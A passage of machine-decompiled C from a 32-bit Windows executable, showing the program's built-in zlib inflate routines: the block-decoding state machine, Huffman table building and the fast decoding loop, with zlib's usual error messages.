          local_18 = (byte *)((int)puVar3 + (-1 - (int)local_24));
        }
        else {
          local_18 = (byte *)(*(int *)((int)this + 0x2c) - (int)local_24);
        }
        if (local_24 == *(undefined4 **)((int)this + 0x2c)) {
          puVar8 = *(undefined4 **)((int)this + 0x28);
          if (puVar8 != puVar3) {
            local_24 = puVar8;
            if (puVar8 < puVar3) {
              local_18 = (byte *)((int)puVar3 + (-1 - (int)puVar8));
            }
            else {
              local_18 = (byte *)(*(int *)((int)this + 0x2c) - (int)puVar8);
            }
          }
        }
        if (local_18 == (byte *)0x0) {
          *(uint *)((int)this + 0x20) = uVar5;
          *(uint *)((int)this + 0x1c) = uVar13;
          in_EAX[1] = local_20;
          goto LAB_00406ebf;
        }
      }
LAB_004069e7:
      param_1 = 0;
      local_1c = *(byte **)((int)this + 4);
      if (local_20 < *(byte **)((int)this + 4)) {
        local_1c = local_20;
      }
      if (local_18 < local_1c) {
        local_1c = local_18;
      }
      FUN_00410450(local_24,puVar12,(uint)local_1c);
      local_20 = local_20 + -(int)local_1c;
      local_24 = (undefined4 *)((int)local_24 + (int)local_1c);
      local_18 = local_18 + -(int)local_1c;
      puVar12 = (undefined4 *)((int)puVar12 + (int)local_1c);
      piVar1 = (int *)((int)this + 4);
      *piVar1 = *piVar1 - (int)local_1c;
      if (*piVar1 == 0) {
        *(uint *)this = -(uint)(*(int *)((int)this + 0x18) != 0) & 7;
      }
      break;
    case (undefined *)0x406a4f:
      for (; uVar13 < 0xe; uVar13 = uVar13 + 8) {
        if (local_20 == (byte *)0x0) goto LAB_00406f63;
        bVar2 = *(byte *)puVar12;
        local_20 = local_20 + -1;
        puVar12 = (undefined4 *)((int)puVar12 + 1);
        param_1 = 0;
        uVar6 = uVar6 | (uint)bVar2 << ((byte)uVar13 & 0x1f);
        local_28 = uVar6;
      }
      *(uint *)((int)this + 4) = uVar6 & 0x3fff;
      if ((0x1d < (uVar6 & 0x1f)) || (uVar11 = (uVar6 & 0x3fff) >> 5 & 0x1f, 0x1d < uVar11)) {
        *(undefined4 *)this = 9;
        in_EAX[6] = (byte *)s_too_many_length_or_distance_symb_0041fe2c;
        goto switchD_00406804_caseD_406f30;
      }
      iVar9 = (*(code *)in_EAX[8])(in_EAX[10],uVar11 + 0x102 + (uVar6 & 0x1f),4);
      *(int *)((int)this + 0xc) = iVar9;
      if (iVar9 == 0) {
        *(uint *)((int)this + 0x20) = local_28;
        *(uint *)((int)this + 0x1c) = uVar13;
        in_EAX[1] = local_20;
        in_EAX[2] = in_EAX[2] + ((int)puVar12 - (int)*in_EAX);
        *in_EAX = (byte *)puVar12;
        *(undefined4 **)((int)this + 0x34) = puVar3;
        FUN_00405ed0(-4);
        return;
      }
      uVar6 = local_28 >> 0xe;
      uVar13 = uVar13 - 0xe;
      *(undefined4 *)((int)this + 8) = 0;
      *(undefined4 *)this = 4;
      local_28 = uVar6;
    case (undefined *)0x406ae1:
      if (*(uint *)((int)this + 8) < (*(uint *)((int)this + 4) >> 10) + 4) {
        do {
          for (; uVar13 < 3; uVar13 = uVar13 + 8) {
            if (local_20 == (byte *)0x0) goto LAB_00406f63;
            bVar2 = *(byte *)puVar12;
            local_20 = local_20 + -1;
            puVar12 = (undefined4 *)((int)puVar12 + 1);
            param_1 = 0;
            local_28 = uVar6 | (uint)bVar2 << ((byte)uVar13 & 0x1f);
            uVar6 = local_28;
          }
          *(uint *)(*(int *)((int)this + 0xc) +
                   *(int *)(&DAT_0041f728 + *(int *)((int)this + 8) * 4) * 4) = uVar6 & 7;
          *(int *)((int)this + 8) = *(int *)((int)this + 8) + 1;
          local_28 = local_28 >> 3;
          uVar13 = uVar13 - 3;
          uVar6 = local_28;
        } while (*(uint *)((int)this + 8) < (*(uint *)((int)this + 4) >> 10) + 4);
      }
      uVar11 = *(uint *)((int)this + 8);
      while (uVar11 < 0x13) {
        *(undefined4 *)
         (*(int *)((int)this + 0xc) + *(int *)(&DAT_0041f728 + *(int *)((int)this + 8) * 4) * 4) = 0
        ;
        *(int *)((int)this + 8) = *(int *)((int)this + 8) + 1;
        uVar11 = *(uint *)((int)this + 8);
      }
      *(int *)((int)this + 0x10) = 7;
      iVar9 = FUN_004076b0(*(void **)((int)this + 0xc),(int *)((int)this + 0x10),
                           (int *)((int)this + 0x14),*(int *)((int)this + 0x24));
      if (iVar9 != 0) {
        if (iVar9 == -3) {
          (*(code *)in_EAX[9])(in_EAX[10],*(undefined4 *)((int)this + 0xc));
          *(undefined4 *)this = 9;
        }
        *(uint *)((int)this + 0x20) = local_28;
        *(uint *)((int)this + 0x1c) = uVar13;
        in_EAX[1] = local_20;
LAB_00406ebf:
        pbVar4 = *in_EAX;
        *in_EAX = (byte *)puVar12;
        in_EAX[2] = in_EAX[2] + ((int)puVar12 - (int)pbVar4);
        *(undefined4 **)((int)this + 0x34) = local_24;
        FUN_00405ed0(iVar9);
        return;
      }
      *(undefined4 *)((int)this + 8) = 0;
      *(undefined4 *)this = 5;
      uVar6 = local_28;
switchD_00406804_caseD_406bb4:
      if (*(uint *)((int)this + 8) <
          (*(uint *)((int)this + 4) >> 5 & 0x1f) + 0x102 + (*(uint *)((int)this + 4) & 0x1f)) {
        do {
          uVar11 = *(uint *)((int)this + 0x10);
          if (uVar13 < uVar11) {
            do {
              if (local_20 == (byte *)0x0) goto LAB_00406f63;
              bVar2 = *(byte *)puVar12;
              local_20 = local_20 + -1;
              bVar10 = (byte)uVar13;
              uVar11 = *(uint *)((int)this + 0x10);
              uVar13 = uVar13 + 8;
              puVar12 = (undefined4 *)((int)puVar12 + 1);
              uVar6 = uVar6 | (uint)bVar2 << (bVar10 & 0x1f);
              param_1 = 0;
              local_28 = uVar6;
            } while (uVar13 < uVar11);
          }
          iVar9 = *(int *)((int)this + 0x14) + (*(uint *)(&DAT_0041e5e0 + uVar11 * 4) & uVar6) * 8;
          bVar2 = *(byte *)(iVar9 + 1);
          uVar11 = (uint)bVar2;
          local_c = *(uint *)(iVar9 + 4);
          if (local_c < 0x10) {
            local_28 = uVar6 >> (bVar2 & 0x1f);
            uVar13 = uVar13 - uVar11;
            *(uint *)(*(int *)((int)this + 0xc) + *(int *)((int)this + 8) * 4) = local_c;
            *(int *)((int)this + 8) = *(int *)((int)this + 8) + 1;
          }
          else {
            if (local_c == 0x12) {
              local_14 = 7;
            }
            else {
              local_14 = local_c - 0xe;
            }
            local_18 = (byte *)((uint)(local_c == 0x12) * 8 + 3);
            local_10 = uVar11 + local_14;
            for (; uVar13 < local_10; uVar13 = uVar13 + 8) {
              if (local_20 == (byte *)0x0) goto LAB_00406f08;
              bVar10 = *(byte *)puVar12;
              local_20 = local_20 + -1;
              puVar12 = (undefined4 *)((int)puVar12 + 1);
              param_1 = 0;
              uVar6 = uVar6 | (uint)bVar10 << ((byte)uVar13 & 0x1f);
              local_28 = uVar6;
            }
            uVar6 = uVar6 >> (bVar2 & 0x1f);
            local_18 = local_18 + (*(uint *)(&DAT_0041e5e0 + local_14 * 4) & uVar6);
            local_28 = uVar6 >> ((byte)local_14 & 0x1f);
            uVar13 = uVar13 - (local_14 + uVar11);
            iVar9 = *(int *)((int)this + 8);
            if ((byte *)((*(uint *)((int)this + 4) >> 5 & 0x1f) + 0x102 +
                        (*(uint *)((int)this + 4) & 0x1f)) < local_18 + iVar9) {
LAB_0040702b:
              (*(code *)in_EAX[9])(in_EAX[10],*(undefined4 *)((int)this + 0xc));
              *(undefined4 *)this = 9;
              in_EAX[6] = (byte *)s_invalid_bit_length_repeat_0041fe50;
              *(uint *)((int)this + 0x20) = local_28;
              *(uint *)((int)this + 0x1c) = uVar13;
              in_EAX[1] = local_20;
              in_EAX[2] = in_EAX[2] + ((int)puVar12 - (int)*in_EAX);
              *in_EAX = (byte *)puVar12;
              *(undefined4 **)((int)this + 0x34) = puVar3;
              FUN_00405ed0(-3);
              return;
            }
            if (local_c == 0x10) {
              if (iVar9 == 0) goto LAB_0040702b;
              uVar7 = *(undefined4 *)(*(int *)((int)this + 0xc) + -4 + iVar9 * 4);
            }
            else {
              uVar7 = 0;
            }
            do {
              *(undefined4 *)(*(int *)((int)this + 0xc) + iVar9 * 4) = uVar7;
              iVar9 = iVar9 + 1;
              local_18 = local_18 + -1;
            } while (local_18 != (byte *)0x0);
            *(int *)((int)this + 8) = iVar9;
            local_18 = (byte *)0x0;
          }
          uVar6 = local_28;
        } while (*(uint *)((int)this + 8) <
                 (*(uint *)((int)this + 4) >> 5 & 0x1f) + 0x102 + (*(uint *)((int)this + 4) & 0x1f))
        ;
      }
      *(undefined4 *)((int)this + 0x14) = 0;
      local_14 = 9;
      local_18 = &DAT_00000006;
      iVar9 = FUN_00407750((*(uint *)((int)this + 4) & 0x1f) + 0x101,
                           (*(uint *)((int)this + 4) >> 5 & 0x1f) + 1,*(void **)((int)this + 0xc),
                           &local_14,(int *)&local_18,&local_8,&local_4,*(int *)((int)this + 0x24));
      if (iVar9 != 0) {
        if (iVar9 == -3) {
          (*(code *)in_EAX[9])(in_EAX[10],*(undefined4 *)((int)this + 0xc));
          *(undefined4 *)this = 9;
        }
        *(uint *)((int)this + 0x20) = local_28;
        *(uint *)((int)this + 0x1c) = uVar13;
        in_EAX[1] = local_20;
        param_1 = iVar9;
        goto LAB_004067e0;
      }
      puVar8 = (undefined4 *)(*(code *)in_EAX[8])(in_EAX[10],1,0x1c);
      if (puVar8 == (undefined4 *)0x0) {
        *(uint *)((int)this + 0x20) = local_28;
        *(uint *)((int)this + 0x1c) = uVar13;
        in_EAX[1] = local_20;
        in_EAX[2] = in_EAX[2] + ((int)puVar12 - (int)*in_EAX);
        *in_EAX = (byte *)puVar12;
        *(undefined4 **)((int)this + 0x34) = puVar3;
        FUN_00405ed0(-4);
        return;
      }
      *(undefined *)(puVar8 + 4) = (undefined)local_14;
      *(undefined *)((int)puVar8 + 0x11) = local_18._0_1_;
      *puVar8 = 0;
      puVar8[5] = local_8;
      puVar8[6] = local_4;
      *(undefined4 **)((int)this + 4) = puVar8;
      (*(code *)in_EAX[9])(in_EAX[10],*(undefined4 *)((int)this + 0xc));
      *(undefined4 *)this = 6;
switchD_00406804_caseD_406e04:
      *(uint *)((int)this + 0x20) = local_28;
      *(uint *)((int)this + 0x1c) = uVar13;
      in_EAX[1] = local_20;
      pbVar4 = *in_EAX;
      *in_EAX = (byte *)puVar12;
      in_EAX[2] = in_EAX[2] + ((int)puVar12 - (int)pbVar4);
      *(undefined4 **)((int)this + 0x34) = puVar3;
      iVar9 = FUN_00406000(this,param_1);
      if (iVar9 != 1) {
        FUN_00405ed0(iVar9);
        return;
      }
      param_1 = 0;
      (*(code *)in_EAX[9])(in_EAX[10],*(undefined4 *)((int)this + 4));
      uVar5 = *(uint *)((int)this + 0x20);
      local_24 = *(undefined4 **)((int)this + 0x34);
      local_20 = in_EAX[1];
      puVar12 = (undefined4 *)*in_EAX;
      uVar13 = *(uint *)((int)this + 0x1c);
      if (local_24 < *(undefined4 **)((int)this + 0x30)) {
        local_18 = (byte *)((int)*(undefined4 **)((int)this + 0x30) + (-1 - (int)local_24));
      }
      else {
        local_18 = (byte *)(*(int *)((int)this + 0x2c) - (int)local_24);
      }
      local_28 = uVar5;
      if (*(int *)((int)this + 0x18) != 0) {
        *(undefined4 *)this = 7;
switchD_00406804_caseD_4070fa:
        *(undefined4 **)((int)this + 0x34) = local_24;
        param_1 = FUN_00405ed0(param_1);
        local_24 = *(undefined4 **)((int)this + 0x34);
        if (*(undefined4 **)((int)this + 0x30) == local_24) {
          *(undefined4 *)this = 8;
switchD_00406804_caseD_407137:
          *(uint *)((int)this + 0x20) = local_28;
          *(uint *)((int)this + 0x1c) = uVar13;
          in_EAX[1] = local_20;
          in_EAX[2] = in_EAX[2] + ((int)puVar12 - (int)*in_EAX);
          *in_EAX = (byte *)puVar12;
          *(undefined4 **)((int)this + 0x34) = local_24;
          FUN_00405ed0(1);
          return;
        }
        *(uint *)((int)this + 0x20) = local_28;
        *(uint *)((int)this + 0x1c) = uVar13;
        in_EAX[1] = local_20;
        goto LAB_004067e0;
      }
      *(undefined4 *)this = 0;
      break;
    case (undefined *)0x406bb4:
      goto switchD_00406804_caseD_406bb4;
    case (undefined *)0x406e04:
      goto switchD_00406804_caseD_406e04;
    case (undefined *)0x406f30:
switchD_00406804_caseD_406f30:
      *(uint *)((int)this + 0x20) = local_28;
      *(uint *)((int)this + 0x1c) = uVar13;
      in_EAX[1] = local_20;
      in_EAX[2] = in_EAX[2] + ((int)puVar12 - (int)*in_EAX);
      *in_EAX = (byte *)puVar12;
      *(undefined4 **)((int)this + 0x34) = puVar3;
      FUN_00405ed0(-3);
      return;
    case (undefined *)0x4070fa:
      goto switchD_00406804_caseD_4070fa;
    case (undefined *)0x407137:
      goto switchD_00406804_caseD_407137;
    }
                    // WARNING: Load size is inaccurate
    uVar11 = *this;
    puVar3 = local_24;
    uVar6 = uVar5;
    uVar5 = local_28;
  } while( true );
LAB_00406f08:
  *(uint *)((int)this + 0x20) = local_28;
  *(uint *)((int)this + 0x1c) = uVar13;
  in_EAX[1] = (byte *)0x0;
  goto LAB_004067e0;
}



undefined4 FUN_004071b0(void)

{
  int iVar1;
  int *unaff_ESI;
  int unaff_EDI;
  
  if ((*unaff_ESI == 4) || (*unaff_ESI == 5)) {
    (**(code **)(unaff_EDI + 0x24))(*(undefined4 *)(unaff_EDI + 0x28),unaff_ESI[3]);
  }
  if (*unaff_ESI == 6) {
    (**(code **)(unaff_EDI + 0x24))(*(undefined4 *)(unaff_EDI + 0x28),unaff_ESI[1]);
  }
  unaff_ESI[0xd] = unaff_ESI[10];
  unaff_ESI[0xc] = unaff_ESI[10];
  *unaff_ESI = 0;
  unaff_ESI[7] = 0;
  unaff_ESI[8] = 0;
  if ((code *)unaff_ESI[0xe] != (code *)0x0) {
    iVar1 = (*(code *)unaff_ESI[0xe])(0,0,0);
    unaff_ESI[0xf] = iVar1;
    *(int *)(unaff_EDI + 0x30) = iVar1;
  }
  (**(code **)(unaff_EDI + 0x24))(*(undefined4 *)(unaff_EDI + 0x28),unaff_ESI[10]);
  (**(code **)(unaff_EDI + 0x24))(*(undefined4 *)(unaff_EDI + 0x28),unaff_ESI[9]);
  (**(code **)(unaff_EDI + 0x24))(*(undefined4 *)(unaff_EDI + 0x28));
  return 0;
}



undefined4 __thiscall
FUN_00407240(void *this,uint param_1,uint param_2,int param_3,int param_4,int *param_5,int param_6,
            uint *param_7,uint *param_8)

{
  uint uVar1;
  undefined3 uVar2;
  undefined4 uVar3;
  uint *puVar4;
  uint *in_EAX;
  int *piVar5;
  uint uVar6;
  int iVar7;
  uint uVar8;
  uint uVar9;
  int iVar10;
  int iVar11;
  uint uVar12;
  undefined4 *puVar13;
  char cVar14;
  uint uVar15;
  int iVar16;
  uint uVar17;
  int iVar18;
  byte bVar19;
  int iVar20;
  uint local_fc;
  uint *local_f8;
  uint local_f4;
  uint local_f0;
  uint *local_ec;
  uint local_e4;
  undefined4 local_dc;
  uint local_d8;
  int local_d4;
  int local_d0;
  int local_c8;
  uint local_c0 [16];
  uint local_80 [16];
  int aiStack_40 [16];
  
  local_c0[0] = 0;
  local_c0[1] = 0;
  local_c0[2] = 0;
  local_c0[3] = 0;
  local_c0[4] = 0;
  local_c0[5] = 0;
  local_c0[6] = 0;
  local_c0[7] = 0;
  local_c0[8] = 0;
  local_c0[9] = 0;
  local_c0[10] = 0;
  local_c0[11] = 0;
  local_c0[12] = 0;
  local_c0[13] = 0;
  local_c0[14] = 0;
  local_c0[15] = 0;
  piVar5 = (int *)this;
  uVar15 = param_1;
  do {
    local_c0[*piVar5] = local_c0[*piVar5] + 1;
    piVar5 = piVar5 + 1;
    uVar15 = uVar15 - 1;
  } while (uVar15 != 0);
  if (local_c0[0] == param_1) {
    *param_5 = 0;
    *in_EAX = 0;
  }
  else {
    local_f0 = 1;
    do {
      if (local_c0[local_f0] != 0) break;
      local_f0 = local_f0 + 1;
    } while (local_f0 < 0x10);
    local_fc = *in_EAX;
    if (*in_EAX < local_f0) {
      local_fc = local_f0;
    }
    uVar15 = 0xf;
    do {
      if (local_c0[uVar15] != 0) break;
      uVar15 = uVar15 - 1;
    } while (uVar15 != 0);
    if (uVar15 < local_fc) {
      local_fc = uVar15;
    }
    *in_EAX = local_fc;
    iVar20 = 1 << ((byte)local_f0 & 0x1f);
    for (uVar9 = local_f0; uVar9 < uVar15; uVar9 = uVar9 + 1) {
      if ((int)(iVar20 - local_c0[uVar9]) < 0) {
        return 0xfffffffd;
      }
      iVar20 = (iVar20 - local_c0[uVar9]) * 2;
    }
    iVar20 = iVar20 - local_c0[uVar15];
    if (iVar20 < 0) {
      return 0xfffffffd;
    }
    local_c0[uVar15] = local_c0[uVar15] + iVar20;
    iVar10 = 0;
    iVar16 = uVar15 - 1;
    local_80[1] = 0;
    if (iVar16 != 0) {
      iVar18 = 0;
      do {
        iVar10 = iVar10 + *(int *)((int)local_c0 + iVar18 + 4);
        iVar16 = iVar16 + -1;
        *(int *)((int)local_80 + iVar18 + 8) = iVar10;
        iVar18 = iVar18 + 4;
      } while (iVar16 != 0);
    }
    uVar9 = 0;
    do {
                    // WARNING: Load size is inaccurate
      iVar10 = *this;
      this = (void *)((int)this + 4);
      if (iVar10 != 0) {
        uVar8 = local_80[iVar10];
        param_8[uVar8] = uVar9;
        local_80[iVar10] = uVar8 + 1;
      }
      uVar9 = uVar9 + 1;
    } while (uVar9 < param_1);
    uVar9 = local_80[uVar15];
    iVar16 = -1;
    iVar10 = -local_fc;
    local_e4 = 0;
    local_80[0] = 0;
    local_ec = param_8;
    aiStack_40[1] = 0;
    local_c8 = 0;
    local_f4 = 0;
    if ((int)local_f0 <= (int)uVar15) {
      local_d0 = local_f0 - 1;
      local_f8 = local_c0 + local_f0;
      do {
        uVar8 = *local_f8;
        uVar3 = local_dc;
        while (local_dc = uVar3, uVar8 != 0) {
          local_dc._2_2_ = (undefined2)((uint)uVar3 >> 0x10);
          uVar1 = uVar8 - 1;
          local_d4 = iVar10 + local_fc;
          if (local_d4 < (int)local_f0) {
            iVar11 = iVar10 - local_fc;
            iVar18 = iVar16;
            do {
              local_d4 = local_d4 + local_fc;
              iVar10 = iVar10 + local_fc;
              iVar16 = iVar18 + 1;
              iVar11 = iVar11 + local_fc;
              uVar17 = uVar15 - iVar10;
              if (local_fc < uVar15 - iVar10) {
                uVar17 = local_fc;
              }
              uVar12 = local_f0 - iVar10;
              uVar6 = 1 << ((byte)uVar12 & 0x1f);
              if ((uVar8 < uVar6) &&
                 (iVar7 = uVar6 + (-1 - uVar1), puVar4 = local_f8, uVar12 < uVar17)) {
                while (uVar12 = uVar12 + 1, uVar12 < uVar17) {
                  if ((uint)(iVar7 * 2) <= puVar4[1]) break;
                  iVar7 = iVar7 * 2 - puVar4[1];
                  puVar4 = puVar4 + 1;
                }
              }
              local_f4 = 1 << ((byte)uVar12 & 0x1f);
              uVar17 = local_f4 + *param_7;
              if (0x5a0 < uVar17) {
                return 0xfffffffd;
              }
              local_c8 = param_6 + *param_7 * 8;
              aiStack_40[iVar18 + 2] = local_c8;
              *param_7 = uVar17;
              if (iVar16 == 0) {
                *param_5 = local_c8;
              }
              else {
                local_80[iVar16] = local_e4;
                uVar17 = local_e4 >> ((byte)iVar11 & 0x1f);
                iVar18 = aiStack_40[iVar16];
                local_d8 = (local_c8 - iVar18 >> 3) - uVar17;
                *(undefined4 *)(iVar18 + uVar17 * 8) = local_dc;
                *(uint *)(iVar18 + 4 + uVar17 * 8) = local_d8;
              }
              iVar18 = iVar16;
            } while (local_d4 < (int)local_f0);
          }
          bVar19 = (byte)iVar10;
          uVar2 = CONCAT21(local_dc._2_2_,(char)local_f0 - bVar19);
          if (local_ec < param_8 + uVar9) {
            local_d8 = *local_ec;
            if (local_d8 < param_2) {
              cVar14 = (-(local_d8 < 0x100) & 0xa0U) + 0x60;
            }
            else {
              iVar18 = (local_d8 - param_2) * 4;
              local_d8 = *(uint *)(iVar18 + param_3);
              cVar14 = *(char *)(iVar18 + param_4) + 'P';
            }
            local_ec = local_ec + 1;
            local_dc = CONCAT31(uVar2,cVar14);
          }
          else {
            local_dc = CONCAT31(uVar2,0xc0);
          }
          iVar18 = 1 << ((char)local_f0 - bVar19 & 0x1f);
          uVar8 = local_e4 >> (bVar19 & 0x1f);
          if (uVar8 < local_f4) {
            puVar13 = (undefined4 *)(local_c8 + uVar8 * 8);
            do {
              *puVar13 = local_dc;
              puVar13[1] = local_d8;
              uVar8 = uVar8 + iVar18;
              puVar13 = puVar13 + iVar18 * 2;
            } while (uVar8 < local_f4);
          }
          uVar17 = 1 << ((byte)local_d0 & 0x1f);
          uVar8 = local_e4 & uVar17;
          while (uVar8 != 0) {
            local_e4 = local_e4 ^ uVar17;
            uVar17 = uVar17 >> 1;
            uVar8 = local_e4 & uVar17;
          }
          local_e4 = local_e4 ^ uVar17;
          uVar8 = uVar1;
          uVar3 = local_dc;
          if (((1 << (bVar19 & 0x1f)) - 1U & local_e4) != local_80[iVar16]) {
            do {
              iVar10 = iVar10 - local_fc;
              iVar16 = iVar16 + -1;
            } while (((1 << ((byte)iVar10 & 0x1f)) - 1U & local_e4) != local_80[iVar16]);
          }
        }
        local_f8 = local_f8 + 1;
        local_d0 = local_d0 + 1;
        local_f0 = local_f0 + 1;
      } while ((int)local_f0 <= (int)uVar15);
    }
    if ((iVar20 != 0) && (uVar15 != 1)) {
      return 0xfffffffb;
    }
  }
  return 0;
}



int __cdecl FUN_004076b0(void *param_1,int *param_2,int *param_3,int param_4)

{
  uint *puVar1;
  int iVar2;
  int unaff_EBX;
  uint local_4;
  
  local_4 = 0;
  puVar1 = (uint *)(**(code **)(unaff_EBX + 0x20))(*(undefined4 *)(unaff_EBX + 0x28),0x13,4);
  if (puVar1 == (uint *)0x0) {
    return -4;
  }
  iVar2 = FUN_00407240(param_1,0x13,0x13,0,0,param_3,param_4,&local_4,puVar1);
  if (iVar2 == -3) {
    *(char **)(unaff_EBX + 0x18) = s_oversubscribed_dynamic_bit_lengt_0041fe6c;
  }
  else if ((iVar2 == -5) || (*param_2 == 0)) {
    *(char **)(unaff_EBX + 0x18) = s_incomplete_dynamic_bit_lengths_t_0041fe94;
    iVar2 = -3;
  }
  (**(code **)(unaff_EBX + 0x24))(*(undefined4 *)(unaff_EBX + 0x28),puVar1);
  return iVar2;
}



int __cdecl
FUN_00407750(uint param_1,uint param_2,void *param_3,int *param_4,int *param_5,int *param_6,
            int *param_7,int param_8)

{
  uint *puVar1;
  int iVar2;
  int unaff_EBX;
  uint local_4;
  
  local_4 = 0;
  puVar1 = (uint *)(**(code **)(unaff_EBX + 0x20))(*(undefined4 *)(unaff_EBX + 0x28),0x120,4);
  if (puVar1 == (uint *)0x0) {
    return -4;
  }
  iVar2 = FUN_00407240(param_3,param_1,0x101,0x41f7a8,0x41f828,param_6,param_8,&local_4,puVar1);
  if (iVar2 == 0) {
    if (*param_4 != 0) {
      iVar2 = FUN_00407240((void *)((int)param_3 + param_1 * 4),param_2,0,0x41f8a8,0x41f920,param_7,
                           param_8,&local_4,puVar1);
      if (iVar2 == 0) {
        if ((*param_5 != 0) || (param_1 < 0x102)) {
          (**(code **)(unaff_EBX + 0x24))(*(undefined4 *)(unaff_EBX + 0x28),puVar1);
          return 0;
        }
      }
      else {
        if (iVar2 == -3) {
          *(char **)(unaff_EBX + 0x18) = s_oversubscribed_distance_tree_0041fefc;
          (**(code **)(unaff_EBX + 0x24))(*(undefined4 *)(unaff_EBX + 0x28),puVar1);
          return -3;
        }
        if (iVar2 == -5) {
          *(char **)(unaff_EBX + 0x18) = s_incomplete_distance_tree_0041ff1c;
          (**(code **)(unaff_EBX + 0x24))(*(undefined4 *)(unaff_EBX + 0x28),puVar1);
          return -3;
        }
        if (iVar2 == -4) goto LAB_00407884;
      }
      *(char **)(unaff_EBX + 0x18) = s_empty_distance_tree_with_lengths_0041ff38;
      iVar2 = -3;
LAB_00407884:
      (**(code **)(unaff_EBX + 0x24))(*(undefined4 *)(unaff_EBX + 0x28),puVar1);
      return iVar2;
    }
  }
  else {
    if (iVar2 == -3) {
      *(char **)(unaff_EBX + 0x18) = s_oversubscribed_literal_length_tr_0041feb8;
      goto LAB_004078b9;
    }
    if (iVar2 == -4) goto LAB_004078b9;
  }
  *(char **)(unaff_EBX + 0x18) = s_incomplete_literal_length_tree_0041fedc;
  iVar2 = -3;
LAB_004078b9:
  (**(code **)(unaff_EBX + 0x24))(*(undefined4 *)(unaff_EBX + 0x28),puVar1);
  return iVar2;
}



undefined4 __cdecl
FUN_004078d0(int param_1,int param_2,int param_3,int param_4,int param_5,byte **param_6)

{
  byte bVar1;
  uint uVar2;
  byte *pbVar3;
  uint uVar4;
  int iVar5;
  uint uVar6;
  int iVar7;
  undefined *puVar8;
  uint uVar9;
  uint uVar10;
  byte *pbVar11;
  byte *pbVar12;
  uint uVar13;
  undefined *puVar14;
  uint uVar15;
  undefined *puVar16;
  byte *local_14;
  undefined *local_10;
  byte *local_c;
  
  pbVar11 = *param_6;
  local_14 = param_6[1];
  uVar15 = *(uint *)(param_5 + 0x20);
  puVar16 = *(undefined **)(param_5 + 0x34);
  uVar4 = *(uint *)(param_5 + 0x1c);
  if (puVar16 < *(undefined **)(param_5 + 0x30)) {
    local_10 = *(undefined **)(param_5 + 0x30) + (-1 - (int)puVar16);
  }
  else {
    local_10 = (undefined *)(*(int *)(param_5 + 0x2c) - (int)puVar16);
  }
  uVar9 = *(uint *)(&DAT_0041e5e0 + param_1 * 4);
  uVar2 = *(uint *)(&DAT_0041e5e0 + param_2 * 4);
  local_c = pbVar11;
  do {
    for (; uVar4 < 0x14; uVar4 = uVar4 + 8) {
      bVar1 = *pbVar11;
      local_14 = local_14 + -1;
      pbVar11 = pbVar11 + 1;
      uVar15 = uVar15 | (uint)bVar1 << ((byte)uVar4 & 0x1f);
      local_c = pbVar11;
    }
    bVar1 = *(byte *)(param_3 + (uVar9 & uVar15) * 8);
    uVar10 = (uint)bVar1;
    iVar7 = param_3 + (uVar9 & uVar15) * 8;
    uVar15 = uVar15 >> (*(byte *)(iVar7 + 1) & 0x1f);
    if (uVar10 == 0) {
      uVar4 = uVar4 - *(byte *)(iVar7 + 1);
      *puVar16 = *(undefined *)(iVar7 + 4);
LAB_00407b1f:
      puVar16 = puVar16 + 1;
      local_10 = local_10 + -1;
    }
    else {
      uVar4 = uVar4 - *(byte *)(iVar7 + 1);
      while ((bVar1 & 0x10) == 0) {
        if ((uVar10 & 0x40) != 0) {
          if ((uVar10 & 0x20) != 0) {
            uVar9 = (int)param_6[1] - (int)local_14;
            if (uVar4 >> 3 < (uint)((int)param_6[1] - (int)local_14)) {
              uVar9 = uVar4 >> 3;
            }
            *(uint *)(param_5 + 0x20) = uVar15;
            *(uint *)(param_5 + 0x1c) = uVar4 + uVar9 * -8;
            param_6[1] = local_14 + uVar9;
            pbVar3 = *param_6;
            *param_6 = pbVar11 + -uVar9;
            param_6[2] = param_6[2] + ((int)(pbVar11 + -uVar9) - (int)pbVar3);
            *(undefined **)(param_5 + 0x34) = puVar16;
            return 1;
          }
          param_6[6] = (byte *)s_invalid_literal_length_code_0041fdc4;
          goto LAB_00407bed;
        }
        iVar5 = (*(uint *)(&DAT_0041e5e0 + uVar10 * 4) & uVar15) + *(int *)(iVar7 + 4);
        bVar1 = *(byte *)(iVar7 + iVar5 * 8);
        uVar10 = (uint)bVar1;
        iVar7 = iVar7 + iVar5 * 8;
        uVar15 = uVar15 >> (*(byte *)(iVar7 + 1) & 0x1f);
        if (uVar10 == 0) {
          uVar4 = uVar4 - *(byte *)(iVar7 + 1);
          *puVar16 = *(undefined *)(iVar7 + 4);
          goto LAB_00407b1f;
        }
        uVar4 = uVar4 - *(byte *)(iVar7 + 1);
      }
      uVar10 = uVar10 & 0xf;
      uVar6 = (*(uint *)(&DAT_0041e5e0 + uVar10 * 4) & uVar15) + *(int *)(iVar7 + 4);
      uVar15 = uVar15 >> (sbyte)uVar10;
      for (uVar4 = uVar4 - uVar10; uVar4 < 0xf; uVar4 = uVar4 + 8) {
        bVar1 = *pbVar11;
        local_14 = local_14 + -1;
        pbVar11 = pbVar11 + 1;
        uVar15 = uVar15 | (uint)bVar1 << ((byte)uVar4 & 0x1f);
        local_c = pbVar11;
      }
      pbVar3 = (byte *)(param_4 + (uVar2 & uVar15) * 8);
      uVar15 = uVar15 >> (pbVar3[1] & 0x1f);
      uVar4 = uVar4 - pbVar3[1];
      bVar1 = *pbVar3;
      while ((bVar1 & 0x10) == 0) {
        if ((bVar1 & 0x40) != 0) {
          param_6[6] = (byte *)s_invalid_distance_code_0041fde0;
LAB_00407bed:
          uVar9 = uVar4 >> 3;
          if ((uint)((int)param_6[1] - (int)local_14) <= uVar4 >> 3) {
            uVar9 = (int)param_6[1] - (int)local_14;
          }
          *(uint *)(param_5 + 0x20) = uVar15;
          *(uint *)(param_5 + 0x1c) = uVar4 + uVar9 * -8;
          param_6[1] = local_14 + uVar9;
          pbVar3 = *param_6;
          *param_6 = pbVar11 + -uVar9;
          param_6[2] = param_6[2] + ((int)(pbVar11 + -uVar9) - (int)pbVar3);
          *(undefined **)(param_5 + 0x34) = puVar16;
          return 0xfffffffd;
        }
        iVar7 = (*(uint *)(&DAT_0041e5e0 + (uint)bVar1 * 4) & uVar15) + *(int *)(pbVar3 + 4);
        pbVar12 = pbVar3 + iVar7 * 8;
        pbVar3 = pbVar3 + iVar7 * 8;
        uVar15 = uVar15 >> (pbVar3[1] & 0x1f);
        uVar4 = uVar4 - pbVar3[1];
        bVar1 = *pbVar12;
      }
      uVar10 = bVar1 & 0xf;
      pbVar12 = pbVar11;
      pbVar11 = local_c;
